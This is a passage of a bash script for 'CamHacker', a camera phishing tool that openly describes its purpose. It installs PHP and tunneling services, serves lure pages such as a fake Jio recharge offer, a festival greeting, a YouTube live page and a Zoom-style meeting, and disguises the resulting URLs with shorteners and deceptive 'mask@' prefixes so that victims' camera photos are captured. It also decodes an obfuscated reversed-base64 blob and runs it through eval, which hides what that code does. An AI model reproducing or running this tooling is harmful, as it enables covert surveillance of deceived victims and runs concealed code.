#!/bin/bash

# CamHacker
# Version    : 1.5
# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
# Date       : 5-09-2021
# License    : MIT
# Copyright  : KasRoudra (2021-2022)
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

: '
MIT License

Copyright (c) 2022 KasRoudra

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${cyan}[${white}+${cyan}] ${yellow}"
info2="${blue}[${white}•${blue}] ${yellow}"
ask="${green}[${white}?${green}] ${purple}"
error="${yellow}[${white}!${yellow}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"



version="1.5"

cwd=`pwd`
tunneler_dir="$HOME/.tunneler"

# Logo
logo="
${green}  ____                _   _            _
${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
${red}                                            [v${version}]
${blue}                                    [By KasRoudra]
"

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

# Check if mac
if command -v brew > /dev/null 2>&1; then
    brew=true
    if command -v ngrok > /dev/null 2>&1; then
        ngrok=true
    else
        ngrok=false
    fi
    if command -v cloudflared > /dev/null 2>&1; then
        cloudflared=true
    else
        cloudflared=false
    fi
    if command -v localxpose > /dev/null 2>&1; then
        loclx=true
    else
        loclx=false
    fi
else
    brew=false
    ngrok=false
    cloudflared=false
    loclx=false
fi

# Kill running instances of required packages
killer() {
    for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
        if pidof "$process"  > /dev/null 2>&1; then
            killall "$process"
        fi
    done
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}


# Set template
url_manager() {
    if [[ "$2" == "1" ]]; then
        echo -e "${info}Your urls are: \n"
    fi
    echo -e "${success}URL ${2} > ${1}\n"
    echo -e "${success}URL ${3} > ${mask}@${1#https://}\n"
    netcheck
    if echo $1 | grep -q "$TUNNELER"; then
        shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
    else 
        shortened=""
    fi
    if ! [ -z "$shortened" ]; then
        if echo "$shortened" | head -n1 | grep -q "https://"; then
            echo -e "${success}Shortened > ${shortened}\n"
            echo -e "${success}Masked > ${mask}@${shortened#https://}\n"
        fi
    fi
}


# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2


echo -e "\n${info}Please Wait!...\n${nc}"

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
else
    termux=false
fi

# Workdir

if [ -z "$DIRECTORY" ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            if ! [ -d /sdcard/Pictures ]; then
                cd /sdcard && mkdir Pictures
            fi
            FOL="/sdcard/Pictures"
            cd "$FOL"
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
            cd "$cwd"
        else
            if [ -d "$HOME/Pictures" ]; then
                FOL="$HOME/Pictures"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi


# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
   if [ $TUNNELER == "cloudflared" ]; then
       TUNNELER="cloudflare"
   fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi

# Install required packages
for package in php curl wget unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${info}Installing ${package}....${nc}"
        for pacman in pkg apt apt-get yum dnf brew; do
            if command -v "$pacman" > /dev/null 2>&1; then
                if $sudo; then
                    sudo $pacman install $package
                else
                    $pacman install $package
                fi
                break
            fi
        done
        if command -v "apk" > /dev/null 2>&1; then
            if $sudo; then
                sudo apk add $package
            else
                apk add $package
            fi
            break
        fi
        if command -v "pacman" > /dev/null 2>&1; then
            if $sudo; then
                sudo pacman -S $package
            else
                pacman -S $package
            fi
            break
        fi
    fi
done

# Check for proot in termux
if $termux; then
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${info}Installing proot...."
        pkg install proot -y
    fi
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${error}Proot can't be installed!\007\n"
        exit 1
    fi
fi

# Check if required packages are successfully installed
for package in php wget curl unzip; do
    if ! command -v "$package"  > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done

# Check for running processes that couldn't be terminated
killer
for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
    if pidof "$process"  > /dev/null 2>&1; then
        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
        exit 1
    fi
done


# Download tunnlers
arch=$(uname -m)
platform=$(uname)
if ! [[ -d $tunneler_dir ]]; then
    mkdir $tunneler_dir
fi
if ! [[ -f $tunneler_dir/ngrok ]] ; then
    nongrok=true
else
    nongrok=false
fi
if ! [[ -f $tunneler_dir/cloudflared ]] ; then
    nocf=true
else
    nocf=false
fi
if ! [[ -f $tunneler_dir/loclx ]] ; then
    noloclx=true
else
    noloclx=false
fi
netcheck
rm -rf ngrok.tgz ngrok.zip cloudflared cloudflared.tgz loclx.zip
cd "$cwd"
if echo "$platform" | grep -q "Darwin"; then
    if $brew; then
        ! $ngrok && brew install ngrok/ngrok/ngrok
        ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
        ! $loclx && brew install localxpose
    else
        if echo "$arch" | grep -q "x86_64"; then
            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
            $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
        elif echo "$arch" | grep -q "arm64"; then
            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
            echo -e "${error}Device architecture unknown. Download cloudflared manually!"
            sleep 3
            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
        else
            echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
            sleep 3
        fi
    fi
elif echo "$platform" | grep -q "Linux"; then
    if echo "$arch" | grep -q "aarch64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "arm"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
    elif echo "$arch" | grep -q "x86_64"; then
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
    else
        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz" "ngrok.tgz"
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
    fi
else
    echo -e "${error}Unsupported Platform!"
    exit
fi



# Check for update
netcheck
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
    clear
    echo -e "$logo"
    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
            echo -e "\n${success}CamHacker updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "${purple}[•] Changelog:\n${blue}"
                echo -e "$changelog" | head -n4
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Ngrok Authtoken
if ! [[ -e $HOME/.config/ngrok/ngrok.yml ]]; then
    echo -e "\n${ask}Enter your ngrok authtoken:"
    printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
    read auth
    if [ -z "$auth" ]; then
        echo -e "\n${error}No authtoken!\n\007"
        sleep 1
    else
        cd $tunneler_dir && ./ngrok config add-authtoken authtoken ${auth}
    fi
fi

# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:

${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
${cyan}[${white}2${cyan}] ${yellow}Festival
${cyan}[${white}3${cyan}] ${yellow}Live Youtube
${cyan}[${white}4${cyan}] ${yellow}Online Meeting
${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
${cyan}[${white}x${cyan}] ${yellow}About
${cyan}[${white}m${cyan}] ${yellow}More tools
${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read option
    else
        option=$OPTION
    fi
fi
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        mask="https://free-399rs-jio-recharge"
        break
    elif echo $option | grep -q "2"; then
        dir="fest"
        printf "\n${ask}Enter festival name${yellow} (Current: ${green}birthday):${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read fest_name
        mask="https://best-wishes-to-you"
        break
    elif echo $option | grep -q "3"; then
        dir="live"
        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read vid_id
        mask="https://watch-youtube-videos-live"
        break
    elif echo $option | grep -q "4"; then
        dir="om"
        mask="https://join-zoom-online-meeting"
        break
    elif echo $option | grep -q "p"; then
        printf "\n${ask}Enter Port:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT=$pore;
            echo -e "\n${success}Port changed to ${PORT} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "d"; then
        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 2
        else
            FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
            sleep 2
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra]
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
        printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
    elif echo $option | grep -q "0"; then
        echo -e "\n${success}Thanks for using!\n"
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        OPTION=true
        sleep 1
    fi
done
if ! [ -d "$HOME/.site" ]; then
    mkdir "$HOME/.site"
else
    cd $HOME/.site
    rm -rf *
fi
cd "$cwd"
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi

if ! [ -d sites ]; then
    mkdir sites
    netcheck
    wget -q --show-progress "https://github.com/KasRoudra/CamHacker/releases/latest/download/websites.zip"
    unzip websites.zip -d sites > /dev/null 2>&1
    rm -rf websites.zip
fi
cd sites/$dir
cp -r * "$HOME/.site"
# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
cd "$HOME/.site"
php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
sleep 2
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer
    exit 1
else
    echo -e "${success}PHP has started successfully!\n"
fi
echo -e "${info2}Starting tunnelers......\n"
find "$tunneler_dir" -name "*.log" -delete
netcheck
cd $tunneler_dir
if $termux; then
    termux-chroot ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
    termux-chroot ./loclx tunnel http --to ":${PORT}" &> loclx.log &
elif $brew; then
    ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
    localxpose tunnel http --to ":${PORT}" &> loclx.log &
else
    ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
    ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
    ./loclx tunnel http --to ":${PORT}" &> loclx.log &
fi
sleep 10
cd "$HOME/.site"
if echo $option | grep -q "2"; then
    if ! [ -z "$fest_name" ]; then
        sed -i s/"birthday"/"$fest_name"/g index.html
    fi
fi
if echo $option | grep -q "3"; then
    if ! [ -z "$vid_id" ]; then
         netcheck
